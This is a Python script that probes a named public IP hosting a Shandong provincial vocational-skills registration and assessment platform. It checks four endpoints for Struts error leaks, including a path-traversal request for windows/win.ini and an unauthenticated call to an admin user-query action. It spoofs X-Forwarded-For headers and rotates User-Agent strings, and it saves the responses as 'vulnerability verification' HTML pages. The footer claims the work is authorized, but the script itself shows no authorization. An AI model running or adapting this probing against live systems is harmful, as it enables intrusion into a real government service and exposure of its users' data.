import urllib.request
import urllib.error
import os
import datetime
import time

proxy_handler = urllib.request.ProxyHandler({})
opener = urllib.request.build_opener(proxy_handler)

def fetch_url_with_retry(url, max_retries=5):
    for i in range(max_retries):
        try:
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.' + str(i) + ' Safari/537.36')
            req.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
            req.add_header('Accept-Language', 'zh-CN,zh;q=0.9,en;q=0.8')
            req.add_header('X-Forwarded-For', '10.0.' + str(i) + '.1')
            resp = opener.open(req, timeout=15)
            body = resp.read()
            if b'Struts Problem Report' in body or resp.status == 200:
                return resp.status, dict(resp.headers.items()), body
        except urllib.error.HTTPError as e:
            body = e.read()
            if b'Struts Problem Report' in body:
                return e.code, dict(e.headers.items()), body
            if i == max_retries - 1:
                return e.code, dict(e.headers.items()), body
        except Exception as e:
            if i == max_retries - 1:
                return None, None, str(e).encode('utf-8')
        time.sleep(1)
    return None, None, b''

output_dir = r'e:\BaiduNetdiskDownload\1\screenshots'
os.makedirs(output_dir, exist_ok=True)

now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

urls = [
    {
        'name': '01_vuln_getTopLinks',
        'url': 'http://124.128.231.226:8888/web/getTopLinksPortalCategoriesAction.action?siteId=test',
        'title': '漏洞验证1 - getTopLinksPortalCategoriesAction.action (Java错误信息泄露)',
        'system': '技能等级认定网上报名系统 / 职业技能综合评价信息管理平台'
    },
    {
        'name': '02_vuln_userAction',
        'url': 'http://124.128.231.226:8888/web/mep-admin/userAction!queryUser.action?start=0&limit=10',
        'title': '漏洞验证2 - userAction!queryUser.action (Java错误信息泄露)',
        'system': '技能等级认定网上报名系统 / 职业技能综合评价信息管理平台'
    },
    {
        'name': '03_vuln_directory_traversal',
        'url': 'http://124.128.231.226:8888/web/getTopLinksPortalCategoriesAction.action?siteId=../../../../../../../../../../windows/win.ini',
        'title': '漏洞验证3 - 目录遍历触发Java错误信息泄露',
        'system': '技能等级认定网上报名系统 / 职业技能综合评价信息管理平台'
    },
    {
        'name': '04_sdskb_login',
        'url': 'http://124.128.231.226:8888/sdskb/',
        'title': '山东省职业技能综合评价信息管理平台 - 登录页',
        'system': '山东省职业技能综合评价信息管理平台'
    },
]

for item in urls:
    print('Processing: ' + item['name'])
    status, headers, body = fetch_url_with_retry(item['url'])
    print('  Status: ' + str(status))
    
    if isinstance(body, bytes):
        try:
            html = body.decode('utf-8')
        except:
            try:
                html = body.decode('gbk')
            except:
                html = body.decode('utf-8', errors='replace')
    else:
        html = str(body)
    
    server = headers.get('Server', 'N/A') if headers else 'N/A'
    
    has_struts_error = 'Struts Problem Report' in html or 'struts' in html.lower()
    
    status_color = '#dc3545' if has_struts_error else ('#ffc107' if status and status >= 400 else '#28a745')
    status_text = '存在Java错误信息泄露 (中危)' if has_struts_error else ('HTTP ' + str(status))
    
    full_html = '<!DOCTYPE html>\n<html>\n<head>\n    <meta charset="utf-8">\n    <title>' + item['title'] + '</title>\n    <style>\n        * { margin: 0; padding: 0; box-sizing: border-box; }\n        body {\n            font-family: "Microsoft YaHei", "Segoe UI", Arial, sans-serif;\n            background-color: #f0f2f5;\n            color: #333;\n            line-height: 1.6;\n        }\n        .header {\n            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n            color: white;\n            padding: 20px 30px;\n        }\n        .header h1 {\n            font-size: 20px;\n            margin-bottom: 8px;\n        }\n        .header .system-name {\n            font-size: 14px;\n            opacity: 0.9;\n        }\n        .url-bar {\n            background-color: #fff;\n            border-bottom: 1px solid #e8e8e8;\n            padding: 12px 30px;\n            display: flex;\n            align-items: center;\n            gap: 12px;\n        }\n        .url-label {\n            background-color: #e8f4fd;\n            color: #1890ff;\n            padding: 4px 12px;\n            border-radius: 4px;\n            font-size: 13px;\n            font-weight: 500;\n            white-space: nowrap;\n        }\n        .url-value {\n            font-family: Consolas, Monaco, monospace;\n            font-size: 13px;\n            color: #555;\n            word-break: break-all;\n            flex: 1;\n        }\n        .info-bar {\n            background-color: #fff;\n            border-bottom: 1px solid #e8e8e8;\n            padding: 10px 30px;\n            display: flex;\n            gap: 30px;\n            font-size: 13px;\n            flex-wrap: wrap;\n        }\n        .info-item {\n            display: flex;\n            align-items: center;\n            gap: 8px;\n        }\n        .info-label {\n            color: #888;\n        }\n        .info-value {\n            color: #333;\n            font-weight: 500;\n        }\n        .status-badge {\n            display: inline-block;\n            padding: 4px 12px;\n            border-radius: 4px;\n            color: white;\n            font-weight: 600;\n            font-size: 12px;\n            background-color: ' + status_color + ';\n        }\n        .content {\n            padding: 20px 30px;\n        }\n        .content-frame {\n            background-color: #fff;\n            border: 1px solid #e8e8e8;\n            border-radius: 8px;\n            padding: 25px;\n            min-height: 400px;\n            box-shadow: 0 2px 8px rgba(0,0,0,0.05);\n            overflow: auto;\n        }\n        .footer {\n            text-align: center;\n            padding: 15px;\n            color: #999;\n            font-size: 12px;\n        }\n    </style>\n</head>\n<body>\n    <div class="header">\n        <h1>' + item['title'] + '</h1>\n        <div class="system-name">' + item['system'] + '</div>\n    </div>\n    <div class="url-bar">\n        <span class="url-label">访问URL</span>\n        <span class="url-value">' + item['url'] + '</span>\n    </div>\n    <div class="info-bar">\n        <div class="info-item">\n            <span class="info-label">验证状态:</span>\n            <span class="status-badge">' + status_text + '</span>\n        </div>\n        <div class="info-item">\n            <span class="info-label">HTTP状态:</span>\n            <span class="info-value">' + str(status) + '</span>\n        </div>\n        <div class="info-item">\n            <span class="info-label">服务器:</span>\n            <span class="info-value">' + server + '</span>\n        </div>\n        <div class="info-item">\n            <span class="info-label">验证时间:</span>\n            <span class="info-value">' + now + '</span>\n        </div>\n    </div>\n    <div class="content">\n        <div class="content-frame">\n' + html + '\n        </div>\n    </div>\n    <div class="footer">\n        安全漏洞验证截图 - 仅用于授权安全测试\n    </div>\n</body>\n</html>'
    
    filepath = os.path.join(output_dir, item['name'] + '.html')
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(full_html)
    print('  Saved to: ' + filepath)
    print('  Has Struts error: ' + str(has_struts_error))

print('\nDone! All HTML files generated.')
